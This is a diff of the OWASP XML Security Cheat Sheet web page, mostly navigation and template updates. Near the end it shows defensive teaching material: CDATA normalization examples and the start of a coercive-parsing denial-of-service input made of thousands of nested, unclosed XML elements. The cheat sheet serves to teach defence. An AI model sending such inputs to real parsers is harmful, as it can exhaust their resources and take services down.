@@ -1,6 +1,4 @@
 
-
-
 <!doctype html>
 <html lang="en" class="no-js">
   <head>
@@ -11,11 +9,12 @@
         <meta name="description" content="Website with the collection of all the cheat sheets of the project.">
       
       
+      
+      
         <link rel="canonical" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html">
       
-      
       <link rel="shortcut icon" href="../assets/WebSite_Favicon.png">
-      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-5.5.1">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.3">
     
     
       
@@ -23,14 +22,18 @@
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.5d00201e.min.css">
+      <link rel="stylesheet" href="../assets/stylesheets/main.3b61ea93.min.css">
       
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.39b8e14a.min.css">
+        
       
     
     
     
       
-        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
         <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
         <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
       
@@ -48,7 +51,13 @@
   </head>
   
   
-    <body dir="ltr">
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
+      
   
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
@@ -66,7 +75,9 @@
       
     </div>
     
-      <header class="md-header" data-md-component="header">
+      
+
+<header class="md-header" data-md-component="header">
   <nav class="md-header-nav md-grid" aria-label="Header">
     <a href="https://cheatsheetseries.owasp.org/" title="OWASP Cheat Sheet Series" class="md-header-nav__button md-logo" aria-label="OWASP Cheat Sheet Series">
       
@@ -77,18 +88,20 @@
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
     </label>
     <div class="md-header-nav__title" data-md-component="header-title">
-      
-        <div class="md-header-nav__ellipsis">
-          <span class="md-header-nav__topic md-ellipsis">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
             OWASP Cheat Sheet Series
           </span>
-          <span class="md-header-nav__topic md-ellipsis">
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
             
               XML Security
             
           </span>
         </div>
-      
+      </div>
     </div>
     
       <label class="md-header-nav__button md-icon" for="__search">
@@ -99,7 +112,7 @@
   <label class="md-search__overlay" for="__search"></label>
   <div class="md-search__inner" role="search">
     <form class="md-search__form" name="search">
-      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
       <label class="md-search__icon md-icon" for="__search">
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
@@ -140,8 +153,6 @@
     
     <div class="md-container" data-md-component="container">
       
-        
-      
       
         
       
@@ -149,10 +160,16 @@
         <div class="md-main__inner md-grid">
           
             
-              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
                 <div class="md-sidebar__scrollwrap">
                   <div class="md-sidebar__inner">
-                    <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
     <a href="https://cheatsheetseries.owasp.org/" title="OWASP Cheat Sheet Series" class="md-nav__button md-logo" aria-label="OWASP Cheat Sheet Series">
       
@@ -182,8 +199,9 @@
       
 
 
+
   <li class="md-nav__item">
-    <a href="../index.html" title="Introduction" class="md-nav__link">
+    <a href="../index.html" class="md-nav__link">
       Introduction
     </a>
   </li>
@@ -194,8 +212,9 @@
       
 
 
+
   <li class="md-nav__item">
-    <a href="../Glossary.html" title="Index Alphabetical" class="md-nav__link">
+    <a href="../Glossary.html" class="md-nav__link">
       Index Alphabetical
     </a>
   </li>
@@ -206,8 +225,9 @@
       
 
 
+
   <li class="md-nav__item">
-    <a href="../IndexASVS.html" title="Index ASVS" class="md-nav__link">
+    <a href="../IndexASVS.html" class="md-nav__link">
       Index ASVS
     </a>
   </li>
@@ -218,8 +238,9 @@
       
 
 
+
   <li class="md-nav__item">
-    <a href="../IndexProactiveControls.html" title="Index Proactive Controls" class="md-nav__link">
+    <a href="../IndexProactiveControls.html" class="md-nav__link">
       Index Proactive Controls
     </a>
   </li>
@@ -229,24 +250,23 @@
       
       
 
+
   
 
 
+  
   <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
     
       <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5" checked>
     
     <label class="md-nav__link" for="nav-5">
       Cheatsheets
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
-      </span>
+      <span class="md-nav__icon md-icon"></span>
     </label>
     <nav class="md-nav" aria-label="Cheatsheets" data-md-level="1">
       <label class="md-nav__title" for="nav-5">
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-        </span>
+        <span class="md-nav__icon md-icon"></span>
         Cheatsheets
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -257,8 +277,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="AJAX_Security_Cheat_Sheet.html" title="AJAX Security" class="md-nav__link">
+    <a href="AJAX_Security_Cheat_Sheet.html" class="md-nav__link">
       AJAX Security
     </a>
   </li>
@@ -269,8 +290,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Abuse_Case_Cheat_Sheet.html" title="Abuse Case" class="md-nav__link">
+    <a href="Abuse_Case_Cheat_Sheet.html" class="md-nav__link">
       Abuse Case
     </a>
   </li>
@@ -281,8 +303,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Access_Control_Cheat_Sheet.html" title="Access Control" class="md-nav__link">
+    <a href="Access_Control_Cheat_Sheet.html" class="md-nav__link">
       Access Control
     </a>
   </li>
@@ -293,8 +316,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Attack_Surface_Analysis_Cheat_Sheet.html" title="Attack Surface Analysis" class="md-nav__link">
+    <a href="Attack_Surface_Analysis_Cheat_Sheet.html" class="md-nav__link">
       Attack Surface Analysis
     </a>
   </li>
@@ -305,8 +329,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Authentication_Cheat_Sheet.html" title="Authentication" class="md-nav__link">
+    <a href="Authentication_Cheat_Sheet.html" class="md-nav__link">
       Authentication
     </a>
   </li>
@@ -317,8 +342,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Authorization_Testing_Automation_Cheat_Sheet.html" title="Authorization Testing Automation" class="md-nav__link">
+    <a href="Authorization_Testing_Automation_Cheat_Sheet.html" class="md-nav__link">
       Authorization Testing Automation
     </a>
   </li>
@@ -329,8 +355,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Bean_Validation_Cheat_Sheet.html" title="Bean Validation" class="md-nav__link">
+    <a href="Bean_Validation_Cheat_Sheet.html" class="md-nav__link">
       Bean Validation
     </a>
   </li>
@@ -341,8 +368,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="C-Based_Toolchain_Hardening_Cheat_Sheet.html" title="C-Based Toolchain Hardening" class="md-nav__link">
+    <a href="C-Based_Toolchain_Hardening_Cheat_Sheet.html" class="md-nav__link">
       C-Based Toolchain Hardening
     </a>
   </li>
@@ -353,8 +381,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Choosing_and_Using_Security_Questions_Cheat_Sheet.html" title="Choosing and Using Security Questions" class="md-nav__link">
+    <a href="Choosing_and_Using_Security_Questions_Cheat_Sheet.html" class="md-nav__link">
       Choosing and Using Security Questions
     </a>
   </li>
@@ -365,8 +394,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Clickjacking_Defense_Cheat_Sheet.html" title="Clickjacking Defense" class="md-nav__link">
+    <a href="Clickjacking_Defense_Cheat_Sheet.html" class="md-nav__link">
       Clickjacking Defense
     </a>
   </li>
@@ -377,8 +407,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Content_Security_Policy_Cheat_Sheet.html" title="Content Security Policy" class="md-nav__link">
+    <a href="Content_Security_Policy_Cheat_Sheet.html" class="md-nav__link">
       Content Security Policy
     </a>
   </li>
@@ -389,8 +420,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Credential_Stuffing_Prevention_Cheat_Sheet.html" title="Credential Stuffing Prevention" class="md-nav__link">
+    <a href="Credential_Stuffing_Prevention_Cheat_Sheet.html" class="md-nav__link">
       Credential Stuffing Prevention
     </a>
   </li>
@@ -401,8 +433,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" title="Cross-Site Request Forgery Prevention" class="md-nav__link">
+    <a href="Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" class="md-nav__link">
       Cross-Site Request Forgery Prevention
     </a>
   </li>
@@ -413,8 +446,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Cross_Site_Scripting_Prevention_Cheat_Sheet.html" title="Cross Site Scripting Prevention" class="md-nav__link">
+    <a href="Cross_Site_Scripting_Prevention_Cheat_Sheet.html" class="md-nav__link">
       Cross Site Scripting Prevention
     </a>
   </li>
@@ -425,8 +459,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Cryptographic_Storage_Cheat_Sheet.html" title="Cryptographic Storage" class="md-nav__link">
+    <a href="Cryptographic_Storage_Cheat_Sheet.html" class="md-nav__link">
       Cryptographic Storage
     </a>
   </li>
@@ -437,8 +472,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="DOM_based_XSS_Prevention_Cheat_Sheet.html" title="DOM based XSS Prevention" class="md-nav__link">
+    <a href="DOM_based_XSS_Prevention_Cheat_Sheet.html" class="md-nav__link">
       DOM based XSS Prevention
     </a>
   </li>
@@ -449,8 +485,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Database_Security_Cheat_Sheet.html" title="Database Security" class="md-nav__link">
+    <a href="Database_Security_Cheat_Sheet.html" class="md-nav__link">
       Database Security
     </a>
   </li>
@@ -461,8 +498,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Denial_of_Service_Cheat_Sheet.html" title="Denial of Service" class="md-nav__link">
+    <a href="Denial_of_Service_Cheat_Sheet.html" class="md-nav__link">
       Denial of Service
     </a>
   </li>
@@ -473,8 +511,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Deserialization_Cheat_Sheet.html" title="Deserialization" class="md-nav__link">
+    <a href="Deserialization_Cheat_Sheet.html" class="md-nav__link">
       Deserialization
     </a>
   </li>
@@ -485,8 +524,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Docker_Security_Cheat_Sheet.html" title="Docker Security" class="md-nav__link">
+    <a href="Docker_Security_Cheat_Sheet.html" class="md-nav__link">
       Docker Security
     </a>
   </li>
@@ -497,8 +537,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="DotNet_Security_Cheat_Sheet.html" title="DotNet Security" class="md-nav__link">
+    <a href="DotNet_Security_Cheat_Sheet.html" class="md-nav__link">
       DotNet Security
     </a>
   </li>
@@ -509,8 +550,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Error_Handling_Cheat_Sheet.html" title="Error Handling" class="md-nav__link">
+    <a href="Error_Handling_Cheat_Sheet.html" class="md-nav__link">
       Error Handling
     </a>
   </li>
@@ -521,8 +563,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="File_Upload_Cheat_Sheet.html" title="File Upload" class="md-nav__link">
+    <a href="File_Upload_Cheat_Sheet.html" class="md-nav__link">
       File Upload
     </a>
   </li>
@@ -533,8 +576,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Forgot_Password_Cheat_Sheet.html" title="Forgot Password" class="md-nav__link">
+    <a href="Forgot_Password_Cheat_Sheet.html" class="md-nav__link">
       Forgot Password
     </a>
   </li>
@@ -545,8 +589,22 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="HTML5_Security_Cheat_Sheet.html" title="HTML5 Security" class="md-nav__link">
+    <a href="GraphQL_Cheat_Sheet.html" class="md-nav__link">
+      GraphQL
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="HTML5_Security_Cheat_Sheet.html" class="md-nav__link">
       HTML5 Security
     </a>
   </li>
@@ -557,8 +615,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="HTTP_Strict_Transport_Security_Cheat_Sheet.html" title="HTTP Strict Transport Security" class="md-nav__link">
+    <a href="HTTP_Strict_Transport_Security_Cheat_Sheet.html" class="md-nav__link">
       HTTP Strict Transport Security
     </a>
   </li>
@@ -569,8 +628,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Injection_Prevention_Cheat_Sheet.html" title="Injection Prevention" class="md-nav__link">
+    <a href="Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
       Injection Prevention
     </a>
   </li>
@@ -581,8 +641,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Injection_Prevention_in_Java_Cheat_Sheet.html" title="Injection Prevention in Java" class="md-nav__link">
+    <a href="Injection_Prevention_in_Java_Cheat_Sheet.html" class="md-nav__link">
       Injection Prevention in Java
     </a>
   </li>
@@ -593,8 +654,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Input_Validation_Cheat_Sheet.html" title="Input Validation" class="md-nav__link">
+    <a href="Input_Validation_Cheat_Sheet.html" class="md-nav__link">
       Input Validation
     </a>
   </li>
@@ -605,8 +667,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" title="Insecure Direct Object Reference Prevention" class="md-nav__link">
+    <a href="Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" class="md-nav__link">
       Insecure Direct Object Reference Prevention
     </a>
   </li>
@@ -617,8 +680,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="JAAS_Cheat_Sheet.html" title="JAAS" class="md-nav__link">
+    <a href="JAAS_Cheat_Sheet.html" class="md-nav__link">
       JAAS
     </a>
   </li>
@@ -629,8 +693,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="JSON_Web_Token_for_Java_Cheat_Sheet.html" title="JSON Web Token for Java" class="md-nav__link">
+    <a href="JSON_Web_Token_for_Java_Cheat_Sheet.html" class="md-nav__link">
       JSON Web Token for Java
     </a>
   </li>
@@ -641,8 +706,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Key_Management_Cheat_Sheet.html" title="Key Management" class="md-nav__link">
+    <a href="Key_Management_Cheat_Sheet.html" class="md-nav__link">
       Key Management
     </a>
   </li>
@@ -653,8 +719,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="LDAP_Injection_Prevention_Cheat_Sheet.html" title="LDAP Injection Prevention" class="md-nav__link">
+    <a href="LDAP_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
       LDAP Injection Prevention
     </a>
   </li>
@@ -665,8 +732,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Logging_Cheat_Sheet.html" title="Logging" class="md-nav__link">
+    <a href="Logging_Cheat_Sheet.html" class="md-nav__link">
       Logging
     </a>
   </li>
@@ -677,8 +745,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Mass_Assignment_Cheat_Sheet.html" title="Mass Assignment" class="md-nav__link">
+    <a href="Mass_Assignment_Cheat_Sheet.html" class="md-nav__link">
       Mass Assignment
     </a>
   </li>
@@ -689,8 +758,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Microservices_based_Security_Arch_Doc_Cheat_Sheet.html" title="Microservices based Security Arch Doc" class="md-nav__link">
+    <a href="Microservices_based_Security_Arch_Doc_Cheat_Sheet.html" class="md-nav__link">
       Microservices based Security Arch Doc
     </a>
   </li>
@@ -701,8 +771,22 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Multifactor_Authentication_Cheat_Sheet.html" title="Multifactor Authentication" class="md-nav__link">
+    <a href="Microservices_security.html" class="md-nav__link">
+      Microservices security.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="Multifactor_Authentication_Cheat_Sheet.html" class="md-nav__link">
       Multifactor Authentication
     </a>
   </li>
@@ -713,8 +797,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Nodejs_Security_Cheat_Sheet.html" title="Nodejs Security" class="md-nav__link">
+    <a href="Nodejs_Security_Cheat_Sheet.html" class="md-nav__link">
       Nodejs Security
     </a>
   </li>
@@ -725,8 +810,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="OS_Command_Injection_Defense_Cheat_Sheet.html" title="OS Command Injection Defense" class="md-nav__link">
+    <a href="OS_Command_Injection_Defense_Cheat_Sheet.html" class="md-nav__link">
       OS Command Injection Defense
     </a>
   </li>
@@ -737,8 +823,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="PHP_Configuration_Cheat_Sheet.html" title="PHP Configuration" class="md-nav__link">
+    <a href="PHP_Configuration_Cheat_Sheet.html" class="md-nav__link">
       PHP Configuration
     </a>
   </li>
@@ -749,8 +836,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Password_Storage_Cheat_Sheet.html" title="Password Storage" class="md-nav__link">
+    <a href="Password_Storage_Cheat_Sheet.html" class="md-nav__link">
       Password Storage
     </a>
   </li>
@@ -761,8 +849,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Pinning_Cheat_Sheet.html" title="Pinning" class="md-nav__link">
+    <a href="Pinning_Cheat_Sheet.html" class="md-nav__link">
       Pinning
     </a>
   </li>
@@ -773,8 +862,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Query_Parameterization_Cheat_Sheet.html" title="Query Parameterization" class="md-nav__link">
+    <a href="Query_Parameterization_Cheat_Sheet.html" class="md-nav__link">
       Query Parameterization
     </a>
   </li>
@@ -785,8 +875,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="REST_Assessment_Cheat_Sheet.html" title="REST Assessment" class="md-nav__link">
+    <a href="REST_Assessment_Cheat_Sheet.html" class="md-nav__link">
       REST Assessment
     </a>
   </li>
@@ -797,8 +888,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="REST_Security_Cheat_Sheet.html" title="REST Security" class="md-nav__link">
+    <a href="REST_Security_Cheat_Sheet.html" class="md-nav__link">
       REST Security
     </a>
   </li>
@@ -809,8 +901,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Ruby_on_Rails_Cheat_Sheet.html" title="Ruby on Rails" class="md-nav__link">
+    <a href="Ruby_on_Rails_Cheat_Sheet.html" class="md-nav__link">
       Ruby on Rails
     </a>
   </li>
@@ -821,8 +914,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="SAML_Security_Cheat_Sheet.html" title="SAML Security" class="md-nav__link">
+    <a href="SAML_Security_Cheat_Sheet.html" class="md-nav__link">
       SAML Security
     </a>
   </li>
@@ -833,8 +927,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="SQL_Injection_Prevention_Cheat_Sheet.html" title="SQL Injection Prevention" class="md-nav__link">
+    <a href="SQL_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
       SQL Injection Prevention
     </a>
   </li>
@@ -845,8 +940,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Securing_Cascading_Style_Sheets_Cheat_Sheet.html" title="Securing Cascading Style Sheets" class="md-nav__link">
+    <a href="Securing_Cascading_Style_Sheets_Cheat_Sheet.html" class="md-nav__link">
       Securing Cascading Style Sheets
     </a>
   </li>
@@ -857,8 +953,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" title="Server Side Request Forgery Prevention" class="md-nav__link">
+    <a href="Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" class="md-nav__link">
       Server Side Request Forgery Prevention
     </a>
   </li>
@@ -869,8 +966,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Session_Management_Cheat_Sheet.html" title="Session Management" class="md-nav__link">
+    <a href="Session_Management_Cheat_Sheet.html" class="md-nav__link">
       Session Management
     </a>
   </li>
@@ -881,8 +979,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="TLS_Cipher_String_Cheat_Sheet.html" title="TLS Cipher String" class="md-nav__link">
+    <a href="TLS_Cipher_String_Cheat_Sheet.html" class="md-nav__link">
       TLS Cipher String
     </a>
   </li>
@@ -893,8 +992,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Third_Party_Javascript_Management_Cheat_Sheet.html" title="Third Party Javascript Management" class="md-nav__link">
+    <a href="Third_Party_Javascript_Management_Cheat_Sheet.html" class="md-nav__link">
       Third Party Javascript Management
     </a>
   </li>
@@ -905,8 +1005,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Threat_Modeling_Cheat_Sheet.html" title="Threat Modeling" class="md-nav__link">
+    <a href="Threat_Modeling_Cheat_Sheet.html" class="md-nav__link">
       Threat Modeling
     </a>
   </li>
@@ -917,8 +1018,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Transaction_Authorization_Cheat_Sheet.html" title="Transaction Authorization" class="md-nav__link">
+    <a href="Transaction_Authorization_Cheat_Sheet.html" class="md-nav__link">
       Transaction Authorization
     </a>
   </li>
@@ -929,8 +1031,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Transport_Layer_Protection_Cheat_Sheet.html" title="Transport Layer Protection" class="md-nav__link">
+    <a href="Transport_Layer_Protection_Cheat_Sheet.html" class="md-nav__link">
       Transport Layer Protection
     </a>
   </li>
@@ -941,8 +1044,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html" title="Unvalidated Redirects and Forwards" class="md-nav__link">
+    <a href="Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html" class="md-nav__link">
       Unvalidated Redirects and Forwards
     </a>
   </li>
@@ -953,8 +1057,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="User_Privacy_Protection_Cheat_Sheet.html" title="User Privacy Protection" class="md-nav__link">
+    <a href="User_Privacy_Protection_Cheat_Sheet.html" class="md-nav__link">
       User Privacy Protection
     </a>
   </li>
@@ -965,8 +1070,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Virtual_Patching_Cheat_Sheet.html" title="Virtual Patching" class="md-nav__link">
+    <a href="Virtual_Patching_Cheat_Sheet.html" class="md-nav__link">
       Virtual Patching
     </a>
   </li>
@@ -977,8 +1083,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Vulnerability_Disclosure_Cheat_Sheet.html" title="Vulnerability Disclosure" class="md-nav__link">
+    <a href="Vulnerability_Disclosure_Cheat_Sheet.html" class="md-nav__link">
       Vulnerability Disclosure
     </a>
   </li>
@@ -989,8 +1096,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Vulnerable_Dependency_Management_Cheat_Sheet.html" title="Vulnerable Dependency Management" class="md-nav__link">
+    <a href="Vulnerable_Dependency_Management_Cheat_Sheet.html" class="md-nav__link">
       Vulnerable Dependency Management
     </a>
   </li>
@@ -1001,8 +1109,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="Web_Service_Security_Cheat_Sheet.html" title="Web Service Security" class="md-nav__link">
+    <a href="Web_Service_Security_Cheat_Sheet.html" class="md-nav__link">
       Web Service Security
     </a>
   </li>
@@ -1013,8 +1122,9 @@
           
 
 
+
   <li class="md-nav__item">
-    <a href="XML_External_Entity_Prevention_Cheat_Sheet.html" title="XML External Entity Prevention" class="md-nav__link">
+    <a href="XML_External_Entity_Prevention_Cheat_Sheet.html" class="md-nav__link">
       XML External Entity Prevention
     </a>
   </li>
@@ -1023,6 +1133,7 @@
           
           
           
+
 
   
 
@@ -1036,12 +1147,10 @@
     
       <label class="md-nav__link md-nav__link--active" for="__toc">
         XML Security
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg>
-        </span>
+        <span class="md-nav__icon md-icon"></span>
       </label>
     
-    <a href="XML_Security_Cheat_Sheet.html" title="XML Security" class="md-nav__link md-nav__link--active">
+    <a href="XML_Security_Cheat_Sheet.html" class="md-nav__link md-nav__link--active">
       XML Security
     </a>
     
@@ -1053,9 +1162,7 @@
   
   
     <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-      </span>
+      <span class="md-nav__icon md-icon"></span>
       Table of contents
     </label>
     <ul class="md-nav__list" data-md-scrollfix>
@@ -1507,7 +1614,8 @@
               </div>
             
             
-              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
                 <div class="md-sidebar__scrollwrap">
                   <div class="md-sidebar__inner">
                     
@@ -1518,9 +1626,7 @@
   
   
     <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-      </span>
+      <span class="md-nav__icon md-icon"></span>
       Table of contents
     </label>
     <ul class="md-nav__list" data-md-scrollfix>
@@ -1966,9 +2072,6 @@
               
                 
                 
-                  
-                
-                
                 <h1 id="xml-security-cheat-sheet">XML Security Cheat Sheet<a class="headerlink" href="#xml-security-cheat-sheet" title="Permanent link">&para;</a></h1>
 <h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
 <p>Specifications for XML and XML schemas include multiple security flaws. At the same time, these specifications provide the tools required to protect XML applications. Even though we use XML schemas to define the security of XML documents, they can be used to perform a variety of attacks: file retrieval, server side request forgery, port scanning, or brute forcing. This cheat sheet exposes how to exploit the different possibilities in libraries and software divided in two sections:</p>
@@ -1994,7 +2097,6 @@
 <span class="nt">&lt;/element&gt;</span>
 </code></pre></div>
 
-
 <h4 id="well-formed-document-to-well-formed-document-normalized">Well-Formed Document to Well-Formed Document Normalized<a class="headerlink" href="#well-formed-document-to-well-formed-document-normalized" title="Permanent link">&para;</a></h4>
 <p>Certain parsers may consider normalizing the contents of your <code>CDATA</code> sections. This means that they will update the special characters contained in the <code>CDATA</code> section to contain the safe versions of these characters even though is not required:</p>
 <div class="codehilite"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
@@ -2002,13 +2104,11 @@
 <span class="nt">&lt;/element&gt;</span>
 </code></pre></div>
 
-
 <p>Normalization of a <code>CDATA</code> section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:</p>
 <div class="codehilite"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
  <span class="ni">&amp;lt;</span>script<span class="ni">&amp;gt;</span>a=1;<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
 <span class="nt">&lt;/element&gt;</span>
 </code></pre></div>
-
 
 <h3 id="coercive-parsing">Coercive Parsing<a class="headerlink" href="#coercive-parsing" title="Permanent link">&para;</a></h3>
 <p>A coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target. Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:</p>
@@ -2018,7 +2118,6 @@
    ...
     <span class="nt">&lt;A30000&gt;</span>
